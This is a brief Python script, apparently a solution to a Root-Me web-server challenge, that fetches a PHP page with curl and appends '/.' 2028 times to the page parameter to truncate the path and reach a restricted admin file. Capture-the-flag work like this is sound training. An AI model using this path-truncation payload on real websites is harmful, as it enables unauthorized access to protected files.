#!/usr/bin/python

import os
import sys

i = 2028
s = 'congratz'

f = os.popen("curl -Ls http://challenge01.root-me.org/web-serveur/ch35/index.php?page=admin.html/" + "/."*i)
s = f.read()
print(s)
